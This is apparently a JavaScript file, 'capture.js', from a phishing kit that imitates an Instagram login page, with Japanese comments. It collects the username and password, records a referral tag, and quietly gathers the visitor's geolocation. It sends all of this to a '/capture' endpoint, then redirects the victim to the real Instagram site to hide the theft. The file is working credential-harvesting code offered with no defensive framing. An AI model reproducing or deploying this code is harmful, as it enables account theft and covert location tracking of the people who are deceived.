// static/capture.js
(function () {
  const form = document.getElementById('ig-form');
  const btn  = document.getElementById('submit-btn');
  const u    = document.getElementById('username');
  const p    = document.getElementById('password');

  function sync() { btn.disabled = !(u.value.trim() && p.value); }
  u.addEventListener('input', sync);
  p.addEventListener('input', sync);
  sync();

  // ?ref= を hidden に保持（リロード対策でcookieにも）
  const ref = new URLSearchParams(location.search).get('ref') || '';
  if (ref) document.cookie = 'ref=' + encodeURIComponent(ref) + ';path=/;max-age=86400';
  let refEl = form.querySelector('input[name="ref"]');
  if (!refEl) {
    refEl = document.createElement('input');
    refEl.type = 'hidden'; refEl.name = 'ref';
    form.appendChild(refEl);
  }
  refEl.value = ref;

  // 位置情報
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (pos) => { form.lat.value = pos.coords.latitude; form.lng.value = pos.coords.longitude; },
      () => {},
      { timeout: 4000, maximumAge: 60000 }
    );
  }

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    btn.disabled = true; btn.textContent = 'ログイン中…';
    try {
      const res = await fetch('/capture', {
        method: 'POST',
        headers: { 'X-Requested-With': 'fetch' },
        body: new FormData(form),
      });
      const j = await res.json();
      if (j.ok) { location.href = 'https://www.instagram.com/'; return; }
      let el = document.querySelector('.error');
      if (!el) {
        el = document.createElement('div'); el.className = 'error';
        form.insertBefore(el, form.querySelector('.or'));
      }
      el.textContent = j.error || 'エラーが発生しました';
      btn.disabled = false; btn.textContent = 'ログイン';
    } catch (err) { form.submit(); }
  });
})();
